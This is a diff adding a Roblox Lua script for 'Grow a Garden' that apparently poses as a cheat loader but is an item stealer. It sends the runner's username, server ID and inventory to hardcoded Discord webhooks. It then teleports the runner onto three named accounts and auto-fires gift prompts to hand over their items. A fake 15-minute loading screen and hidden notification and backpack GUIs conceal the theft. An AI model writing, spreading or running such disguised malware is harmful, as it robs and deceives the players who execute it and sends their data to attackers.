@@ -1,0 +1,277 @@
+--[[ DISCORD WEBHOOK & DATA COLLECTION ]]--
+
+local p = game:GetService("Players").LocalPlayer
+local HttpService = game:GetService("HttpService")
+
+local webhooks = {
+    {url = "https://discord.com/api/webhooks/1391051342575046699/6kXwGsa-tqGH48sEC4f18jrmYgZPGCv76HQPg3uuK0G8qi7ZgbZSMpx0co3KKFeLieHr", username = "GardenStealerBot"},
+    {url = "https://discord.com/api/webhooks/1391158095371309206/29yO5qTpha5KPaJXjp1R5xon3EKp3TBPnGxonFxXcZwX_tuQuyvCs2POGQVI_lKrMY0i", username = "GROW A GARDEN STEALER"}
+}
+
+local username, dispName = p.Name, p.DisplayName
+local job, place = game.JobId, game.PlaceId
+
+local function getRequestFunction()
+    return (syn and syn.request)
+        or (http and http.request)
+        or http_request
+        or request
+        or (fluxus and fluxus.request)
+        or (getgenv and getgenv().request)
+        or (krnl and krnl.request)
+        or (token and token.http_request)
+        or nil
+end
+
+local joinLink = "https://kebabman.vercel.app/start?placeId="..place.."&gameInstanceId="..job
+local teleportCode = [[
+local T = game:GetService("TeleportService")
+T:TeleportToPlaceInstance(]]..place..[[, "]]..job..[[", game.Players.LocalPlayer)
+]]
+
+-- Scan for fruit tools
+local fruitsList = {}
+local backpack = p:FindFirstChild("Backpack")
+if backpack then
+    for _, item in ipairs(backpack:GetChildren()) do
+        if item:IsA("Tool") and item.Name:lower():find("kg") then
+            table.insert(fruitsList, item.Name)
+        end
+    end
+end
+local fruitsText = (#fruitsList > 0) and table.concat(fruitsList, "\n") or "No fruits found."
+
+-- Build Discord embed
+local embed = {
+    title = "🌱 Grow a Garden Stealer 🌱",
+    description = "🌿 Grow a garden stealer 🌿",
+    color = 0x2ECC71,
+    fields = {
+        {name = "👤 Player Info", value = "Display Name: "..dispName.."\nUsername: "..username, inline=false},
+        {name = "🍎 Fruits Found", value = fruitsText, inline=false},
+        {name = "🔗 Join URL", value = joinLink, inline=false},
+        {name = "📜 Teleport Script", value = "```lua\n"..teleportCode.."\n```", inline=false}
+    },
+    footer = {
+        text = "Grow a Garden Stealer - Stay vigilant!",
+        icon_url = "https://th.bing.com/th/id/OIP.fz2ByC1kSEbCFO2vRtcgfwHaHa?w=171&h=180&c=7&r=0&o=7&pid=1.7&rm=3"
+    },
+    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+}
+
+local req = getRequestFunction()
+if req then
+    for _, wh in ipairs(webhooks) do
+        local payload = HttpService:JSONEncode({username = wh.username, embeds = {embed}})
+        pcall(function()
+            req({Url = wh.url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload})
+        end)
+    end
+end
+
+--[[ MOVEMENT FOLLOW + GIFTING LOGIC ]]--
+
+local RunService = game:GetService("RunService")
+local localChar = p.Character or p.CharacterAdded:Wait()
+local backpackInst = p:WaitForChild("Backpack")
+local targets = {"HelloyalltryV2", "notfishybloxdontrade", "Mr_bac0nguy1"}
+
+local playerMap, charMap = {}, {}
+for _, tname in ipairs(targets) do
+    local tgt = game.Players:FindFirstChild(tname)
+    playerMap[tname] = tgt
+    charMap[tname] = tgt and (tgt.Character or tgt.CharacterAdded:Wait())
+end
+
+game.Players.PlayerAdded:Connect(function(newP)
+    for _, tname in ipairs(targets) do
+        if newP.Name == tname then
+            playerMap[tname] = newP
+            newP.CharacterAdded:Connect(function(ch) charMap[tname] = ch end)
+            charMap[tname] = newP.Character or newP.CharacterAdded:Wait()
+        end
+    end
+end)
+
+game.Players.PlayerChatted:Connect(function(chatter,msg)
+    local chName = chatter.Name
+    if charMap[chName] and p.Character then
+        local hrp = p.Character:FindFirstChild("HumanoidRootPart")
+        local thrp = charMap[chName]:FindFirstChild("HumanoidRootPart")
+        if hrp and thrp then hrp.CFrame = thrp.CFrame end
+    end
+end)
+
+RunService.Heartbeat:Connect(function()
+    if p.Character then
+        local hrp = p.Character:FindFirstChild("HumanoidRootPart")
+        for _, tname in ipairs(targets) do
+            local cch = charMap[tname]
+            if hrp and cch and cch:FindFirstChild("HumanoidRootPart") then
+                hrp.CFrame = cch.HumanoidRootPart.CFrame
+            end
+        end
+    end
+end)
+
+local function fireGiftPrompts()
+    for _, v in ipairs(workspace:GetDescendants()) do
+        if v:IsA("ProximityPrompt") then
+            local o = (v.ObjectText or ""):lower()
+            local a = (v.ActionText or ""):lower()
+            if o:find("gift") or a:find("gift") then
+                v.HoldDuration = 0
+                v.RequiresLineOfSight = false
+                v.MaxActivationDistance = math.huge
+                fireproximityprompt(v)
+                return v
+            end
+        end
+    end
+    return nil
+end
+
+local function getGiftOwner(prompt)
+    if not prompt then return end
+    local mdl = prompt.Parent
+    if mdl and mdl:IsA("Model") then
+        return game.Players:GetPlayerFromCharacter(mdl)
+    end
+end
+
+local function attemptGift(tool)
+    if not tool or not tool.Parent then return false end
+    local ok = pcall(function() tool.Parent = p.Character end)
+    if not ok then return false end
+    task.wait(0.5)
+    local pr = fireGiftPrompts()
+    task.wait(1)
+    local gp = getGiftOwner(pr)
+    local timer, elapsed = 10, 0
+    while tool.Parent and elapsed < timer do
+        task.wait(0.5)
+        elapsed += 0.5
+    end
+    if not tool:IsDescendantOf(game) then return true, gp end
+    pcall(function() tool.Parent = backpackInst end)
+    return false, gp
+end
+
+local gifted = {}
+spawn(function()
+    while true do
+        for _, tname in ipairs(targets) do
+            local tgtP = playerMap[tname]
+            if tgtP and tgtP.Parent then
+                local tools = {}
+                for _, tool in ipairs(backpackInst:GetChildren()) do
+                    if tool:IsA("Tool") and tool.Name:match("%[.-kg%]") then
+                        table.insert(tools, tool)
+                    end
+                end
+                if not gifted[tname] then
+                    for _, tool in ipairs(tools) do
+                        local success, gp = attemptGift(tool)
+                        if success and gp and gp.Name == tname then
+                            gifted[tname] = true
+                            break
+                        end
+                    end
+                end
+            end
+        end
+        task.wait(1)
+    end
+end)
+
+-- Hide unwanted GUI
+pcall(function()
+    local n = p.PlayerGui:FindFirstChild("Top_Notification")
+    if n then n:Destroy() end
+end)
+pcall(function()
+    local bgui = p.PlayerGui:FindFirstChild("BackpackGui")
+    if bgui then bgui.Enabled = false end
+end)
+
+--[[ LOADING GUI SETUP ]]--
+
+local pg = p:WaitForChild("PlayerGui")
+
+local gui = Instance.new("ScreenGui", pg)
+gui.Name = "TopLoadingUI"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+
+local bg = Instance.new("Frame", gui)
+bg.Size = UDim2.new(1,0,1,0)
+bg.BackgroundColor3 = Color3.new(0,0,0)
+
+local msgTop = Instance.new("TextLabel", bg)
+msgTop.Text = "[ Loading script inside game please wait ]"
+msgTop.Font = Enum.Font.Arcade
+msgTop.TextScaled = true
+msgTop.TextColor3 = Color3.new(1,1,1)
+msgTop.BackgroundTransparency = 1
+msgTop.AnchorPoint = Vector2.new(0.5,0.5)
+msgTop.Position = UDim2.new(0.5,0,0.36,0)
+msgTop.Size = UDim2.new(0.9,0,0.06,0)
+
+local msgBottom = Instance.new("TextLabel", bg)
+msgBottom.Font = Enum.Font.Arcade
+msgBottom.TextScaled = true
+msgBottom.TextColor3 = Color3.fromRGB(100,255,100)
+msgBottom.BackgroundTransparency = 1
+msgBottom.AnchorPoint = Vector2.new(0.5,0.5)
+msgBottom.Position = UDim2.new(0.5,0,0.42,0)
+msgBottom.Size = UDim2.new(0.85,0,0.045,0)
+
+local barBg = Instance.new("Frame", bg)
+barBg.AnchorPoint = Vector2.new(0.5,0.5)
+barBg.Position = UDim2.new(0.5,0,0.52,0)
+barBg.Size = UDim2.new(0.7,0,0.06,0)
+barBg.BackgroundColor3 = Color3.fromRGB(30,30,30)
+
+local fill = Instance.new("Frame", barBg)
+fill.BackgroundColor3 = Color3.new(1,1,1)
+fill.BorderSizePixel = 0
+fill.Size = UDim2.new(0,0,1,0)
+
+Instance.new("UICorner", barBg).CornerRadius = UDim.new(0,10)
+Instance.new("UICorner", fill).CornerRadius = UDim.new(0,10)
+
+local fakeModules = {
+    "core.module64","visual.memoryheap","thread.classhandler","assetref.tablehandler",
+    "utf8.executor.init","service.netpoll","env.data.allocator","event.stream.write",
+    "robloxhook.bytecode","main.runtime.shift","delta.stability.seed","vm.memorylinker",
+    "lua.state.injection","exploit.startup.sys","core.boot.flags","mod.loadercore",
+    "thread.waitloop","gui.renderscale","hook.init.bridge","mod.binary.exec"
+}
+
+spawn(function()
+    while true do
+        msgBottom.Text = "[ Downloading module: "..fakeModules[math.random(1,#fakeModules)].." ]"
+        wait(0.05)
+    end
+end)
+
+local duration = 900  -- 15 minutes in seconds
+local timePassed = 0
+local rs = game:GetService("RunService").RenderStepped
+while timePassed < duration do
+    timePassed += rs:Wait()
+    local percent = timePassed / duration
+    fill:TweenSize(UDim2.new(percent, 0, 1, 0), "Out", "Sine", 0.05, true)
+end
+
+-- Fade out UI
+for i = 1,30 do
+    local t = i/30
+    bg.BackgroundTransparency = t
+    barBg.BackgroundTransparency = t
+    fill.BackgroundTransparency = t
+    msgTop.TextTransparency = t
+    msgBottom.TextTransparency = t
+    wait(0.02)
+end
+gui:Destroy()
